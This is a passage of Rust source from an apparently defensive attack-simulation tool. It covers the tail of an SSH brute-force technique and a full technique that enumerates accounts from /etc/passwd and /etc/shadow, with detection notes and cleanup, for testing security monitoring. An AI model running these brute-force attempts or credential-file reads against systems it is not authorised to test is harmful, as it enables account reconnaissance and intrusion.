                            writeln!(log, "  Result: FAILED (password auth disabled or not accepted)").unwrap();
                            writeln!(log, "  Response time: {elapsed_ms}ms").unwrap();
                        } else {
                            writeln!(log, "  Result: CONNECTION FAILED").unwrap();
                        }
                    }
                }
                
                writeln!(log).unwrap();
                
                // Small delay between attempts to simulate realistic brute force
                sleep(Duration::from_millis(500)).await;
            }
            
            // Write timing analysis
            writeln!(log, "## Timing Analysis (Potential Timing Attack Data)").unwrap();
            writeln!(log).unwrap();
            writeln!(log, "Attempt | Password        | Response Time (ms) | Result").unwrap();
            writeln!(log, "--------|-----------------|--------------------|---------").unwrap();
            
            for (num, pwd, time, success) in &timing_data {
                writeln!(log, "{:7} | {:15} | {:18} | {}", 
                    num, 
                    pwd.chars().take(15).collect::<String>(),
                    time,
                    if *success { "SUCCESS" } else { "FAILED" }
                ).unwrap();
            }
            
            writeln!(log).unwrap();
            
            // Calculate timing statistics
            if !timing_data.is_empty() {
                let avg_time: u128 = timing_data.iter().map(|(_, _, t, _)| *t).sum::<u128>() / timing_data.len() as u128;
                let min_time = timing_data.iter().map(|(_, _, t, _)| *t).min().unwrap_or(0);
                let max_time = timing_data.iter().map(|(_, _, t, _)| *t).max().unwrap_or(0);
                
                writeln!(log, "Timing Statistics:").unwrap();
                writeln!(log, "  Average response time: {avg_time}ms").unwrap();
                writeln!(log, "  Minimum response time: {min_time}ms").unwrap();
                writeln!(log, "  Maximum response time: {max_time}ms").unwrap();
                writeln!(log, "  Timing variance: {}ms", max_time - min_time).unwrap();
                writeln!(log).unwrap();
                
                info!("Timing analysis: avg={avg_time}ms, min={min_time}ms, max={max_time}ms");
            }
            
            // Write summary
            writeln!(log, "## Summary").unwrap();
            writeln!(log, "Total attempts: {attempt_count}").unwrap();
            writeln!(log, "Failed attempts: {failed_attempts}").unwrap();
            writeln!(log, "Successful attempts: {successful_attempts}").unwrap();
            writeln!(log).unwrap();
            
            writeln!(log, "=== Authentication Log Entries ===").unwrap();
            writeln!(log, "Failed SSH authentication attempts should now appear in /var/log/auth.log").unwrap();
            writeln!(log, "Example detection command:").unwrap();
            writeln!(log, "  sudo grep 'Failed password' /var/log/auth.log | grep {test_username}").unwrap();
            writeln!(log).unwrap();
            
            writeln!(log, "=== WARNING ===").unwrap();
            writeln!(log, "This technique generated REAL failed SSH authentication attempts.").unwrap();
            writeln!(log, "These attempts are logged in /var/log/auth.log and visible to security tools.").unwrap();
            writeln!(log, "EDR/SIEM systems should detect this activity as potential brute force attack.").unwrap();
            
            // Create artifacts JSON
            let artifacts_json = serde_json::json!({
                "session_id": session_id,
                "timestamp": chrono::Local::now().to_rfc3339(),
                "user_created": user_created,
                "test_username": test_username,
                "target_host": target_host,
                "target_port": target_port,
                "attempt_count": attempt_count,
                "failed_attempts": failed_attempts,
                "successful_attempts": successful_attempts,
                "artifacts": artifacts.clone()
            });
            
            fs::write(&artifact_file, artifacts_json.to_string())
                .map_err(|e| format!("Failed to write artifacts file: {e}"))?;
            
            info!("SSH brute force complete:");
            info!("  - Test user: {test_username}");
            info!("  - Attempts: {attempt_count}");
            info!("  - Failed: {failed_attempts}");
            info!("  - Successful: {successful_attempts}");
            info!("  - Log file: {log_file}");
            if user_created {
                info!("  - User created: YES (requires cleanup)");
            }
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "REAL SSH brute force complete against {target_host}:{target_port} - {attempt_count} attempts ({failed_attempts} failed, {successful_attempts} successful) - {failed_attempts} auth.log entries generated"
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Starting SSH brute force cleanup...");
            
            // Read artifacts JSON to get user creation info
            let artifact_file = artifacts.iter().find(|a| a.contains("_artifacts.json"));
            let mut user_to_delete = None;
            
            if let Some(artifact_path) = artifact_file {
                if let Ok(content) = fs::read_to_string(artifact_path) {
                    if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                        if json["user_created"].as_bool().unwrap_or(false) {
                            user_to_delete = json["test_username"].as_str().map(|s| s.to_string());
                        }
                    }
                }
            }
            
            // Delete test user if it was created
            if let Some(username) = user_to_delete {
                info!("Removing temporary test user: {username}");
                
                let userdel_output = Command::new("userdel")
                    .args(["-r", &username])
                    .output()
                    .await;
                
                match userdel_output {
                    Ok(output) => {
                        if output.status.success() {
                            info!("Successfully removed user: {username}");
                        } else {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            warn!("Failed to remove user {username}: {stderr}");
                        }
                    }
                    Err(e) => {
                        warn!("Failed to execute userdel for {username}: {e}");
                    }
                }
                
                // Verify user removal
                let verify_output = Command::new("grep")
                    .args([&username, "/etc/passwd"])
                    .output()
                    .await;
                
                if let Ok(output) = verify_output {
                    if output.status.success() {
                        warn!("User {username} still exists in /etc/passwd after deletion attempt");
                    } else {
                        info!("Verified user {username} removed from /etc/passwd");
                    }
                }
            }
            
            // Remove artifact files
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            
            info!("SSH brute force cleanup complete");
            Ok(())
        })
    }
}

pub struct EtcPasswdShadow {}

#[async_trait]
impl AttackTechnique for EtcPasswdShadow {
    fn info(&self) -> Technique {
        Technique {
            id: "T1003.008".to_string(),
            name: "/etc/passwd and /etc/shadow".to_string(),
            description: "Completely reads and parses /etc/passwd extracting ALL user account information (usernames, UIDs, GIDs, home directories, shells). Attempts to read /etc/shadow (requires root) to extract password hashes and ageing information. Identifies privileged accounts (UID 0, sudo group members), service accounts, and human users. Generates comprehensive user enumeration report in JSON format. READ-ONLY technique that does NOT modify any system files - purely reconnaissance. Cleanup removes output files only.".to_string(),
            category: "credential_access".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save user enumeration report".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_passwd_shadow_report.json".to_string()),
                },
                TechniqueParameter {
                    name: "detailed_report".to_string(),
                    description: "Generate detailed report with group memberships (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for reads of /etc/passwd and /etc/shadow files, especially by non-root users attempting shadow access, user enumeration patterns, group membership queries via getent or /etc/group access, and processes extracting user account information. Watch for tools parsing password files and exporting user data.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user (root for shadow)".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_passwd_shadow_report.json".to_string())
                .clone();
            
            let detailed_report = config
                .parameters
                .get("detailed_report")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let session_id = Uuid::new_v4().to_string().replace("-", "");
            let is_root = unsafe { libc::geteuid() == 0 };
            
            if dry_run {
                info!("[DRY RUN] Would perform /etc/passwd and /etc/shadow enumeration:");
                info!("[DRY RUN]   Running as root: {is_root}");
                info!("[DRY RUN]   Output file: {output_file}");
                info!("[DRY RUN]   Detailed report: {detailed_report}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would enumerate user accounts from /etc/passwd{}", 
                        if is_root { " and /etc/shadow" } else { "" }),
                    artifacts: vec![output_file],
                    cleanup_required: false,
                });
            }

            info!("Starting user account enumeration (Session: {session_id})...");
            info!("Running as root: {is_root}");
            
            let mut report = serde_json::json!({
                "technique_id": "T1003.008",
                "technique_name": "/etc/passwd and /etc/shadow",
                "session_id": session_id,
                "timestamp": chrono::Local::now().to_rfc3339(),
                "is_root": is_root,
                "users": [],
                "summary": {},
            });
            
            // Phase 1: Parse /etc/passwd
            info!("Phase 1: Reading and parsing /etc/passwd...");
            
            let passwd_content = fs::read_to_string("/etc/passwd")
                .map_err(|e| format!("Failed to read /etc/passwd: {e}"))?;
            
            let mut users_data = Vec::new();
            let mut privileged_users = Vec::new();
            let mut service_accounts = Vec::new();
            let mut human_users = Vec::new();
            
            for line in passwd_content.lines() {
                if line.trim().is_empty() || line.starts_with('#') {
                    continue;
                }
                
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() < 7 {
                    continue;
                }
                
                let username = parts[0];
                let uid = parts[2].parse::<u32>().unwrap_or(0);
                let gid = parts[3].parse::<u32>().unwrap_or(0);
                let gecos = parts[4];
                let home_dir = parts[5];
                let shell = parts[6];
                
                let mut user_info = serde_json::json!({
                    "username": username,
                    "uid": uid,
                    "gid": gid,
                    "gecos": gecos,
                    "home_directory": home_dir,
                    "shell": shell,
                    "is_privileged": uid == 0,
                    "is_service_account": uid < 1000 && uid != 0,
                    "is_human_user": uid >= 1000,
                });
                
                // Categorise users
                if uid == 0 {
                    privileged_users.push(username.to_string());
                } else if uid < 1000 {
                    service_accounts.push(username.to_string());
                } else {
                    human_users.push(username.to_string());
                }
                
                // Get group memberships if detailed report
                if detailed_report {
                    let groups_output = Command::new("groups")
                        .arg(username)
                        .output()
                        .await;
                    
                    if let Ok(output) = groups_output {
                        if output.status.success() {
                            let groups_str = String::from_utf8_lossy(&output.stdout);
                            let groups: Vec<&str> = groups_str
                                .split_whitespace()
                                .skip(2)
                                .collect();
                            user_info["groups"] = serde_json::json!(groups);
                            
                            // Check if user is in sudo/wheel/admin groups
                            let privileged_groups = ["sudo", "wheel", "admin", "root"];
                            let has_privileged_group = groups.iter()
                                .any(|g| privileged_groups.contains(g));
                            
                            if has_privileged_group {
                                user_info["has_sudo_access"] = serde_json::json!(true);
                                if uid != 0 {
                                    privileged_users.push(username.to_string());
                                }
                            }
                        }
                    }
                }
                
                users_data.push(user_info);
            }
            
            info!("Parsed {} users from /etc/passwd", users_data.len());
            info!("  - Privileged users (UID 0 or sudo): {}", privileged_users.len());
            info!("  - Service accounts (UID < 1000): {}", service_accounts.len());
            info!("  - Human users (UID >= 1000): {}", human_users.len());
            
            // Phase 2: Attempt to read /etc/shadow (requires root)
            let mut shadow_accessible = false;
            let mut shadow_data = serde_json::Map::new();
            
            if is_root {
                info!("Phase 2: Reading and parsing /etc/shadow (root access)...");
                
                match fs::read_to_string("/etc/shadow") {
                    Ok(shadow_content) => {
                        shadow_accessible = true;
                        
                        for line in shadow_content.lines() {
                            if line.trim().is_empty() || line.starts_with('#') {
                                continue;
                            }
                            
                            let parts: Vec<&str> = line.split(':').collect();
                            if parts.len() < 9 {
                                continue;
                            }
                            
                            let username = parts[0];
                            let password_hash = parts[1];
                            let last_changed = parts[2];
                            let min_age = parts[3];
                            let max_age = parts[4];
                            let warn_period = parts[5];
                            let inactivity_period = parts[6];
                            let expiration_date = parts[7];
                            
                            let shadow_info = serde_json::json!({
                                "password_hash": if password_hash.is_empty() || password_hash == "*" || password_hash == "!" {
                                    "locked/disabled"
                                } else if password_hash.starts_with("$") {
                                    "hashed"
                                } else {
                                    "other"
                                },
                                "last_password_change": last_changed,
                                "minimum_password_age": min_age,
                                "maximum_password_age": max_age,
                                "password_warning_period": warn_period,
                                "password_inactivity_period": inactivity_period,
                                "account_expiration_date": expiration_date,
                                "has_password": !password_hash.is_empty() && password_hash != "*" && password_hash != "!",
                            });
                            
                            shadow_data.insert(username.to_string(), shadow_info);
                        }
                        
                        info!("Successfully parsed {} shadow entries", shadow_data.len());
                        
                        // Merge shadow data into users_data
                        for user in users_data.iter_mut() {
                            if let Some(username) = user.get("username").and_then(|u| u.as_str()) {
                                if let Some(shadow_info) = shadow_data.get(username) {
                                    user["shadow_info"] = shadow_info.clone();
                                }
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Failed to read /etc/shadow (even with root): {e}");
                    }
                }
            } else {
                info!("Phase 2: Skipping /etc/shadow (not root)");
                info!("Attempting to read /etc/shadow without root privileges...");
                
                match fs::read_to_string("/etc/shadow") {
                    Ok(_) => {
                        warn!("Unexpectedly able to read /etc/shadow without root!");
                        shadow_accessible = true;
                    }
                    Err(e) => {
                        info!("Cannot read /etc/shadow (expected): {e}");
                    }
                }
            }
            
            // Phase 3: Generate comprehensive report
            info!("Phase 3: Generating user enumeration report...");
            
            report["users"] = serde_json::json!(users_data);
            report["summary"] = serde_json::json!({
                "total_users": users_data.len(),
                "privileged_users": privileged_users.len(),
                "service_accounts": service_accounts.len(),
                "human_users": human_users.len(),
                "shadow_accessible": shadow_accessible,
                "privileged_user_list": privileged_users,
                "service_account_list": service_accounts,
                "human_user_list": human_users,
            });
            
            // Write report to file
            let report_json = serde_json::to_string_pretty(&report)
                .map_err(|e| format!("Failed to serialise report: {e}"))?;
            
            fs::write(&output_file, report_json.as_bytes())
                .map_err(|e| format!("Failed to write report file: {e}"))?;
            
            info!("User enumeration report saved to: {output_file}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "Successfully enumerated {} users from /etc/passwd{}: {} privileged, {} service accounts, {} human users",
                    users_data.len(),
                    if shadow_accessible { " and /etc/shadow" } else { "" },
                    privileged_users.len(),
                    service_accounts.len(),
                    human_users.len()
                ),
                artifacts: vec![output_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Starting /etc/passwd and /etc/shadow enumeration cleanup...");
            
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed report file: {artifact}"),
                        Err(e) => warn!("Failed to remove report file {artifact}: {e}"),
                    }
                }
            }
            
            info!("/etc/passwd and /etc/shadow enumeration cleanup complete");
            Ok(())
        })
    }
}
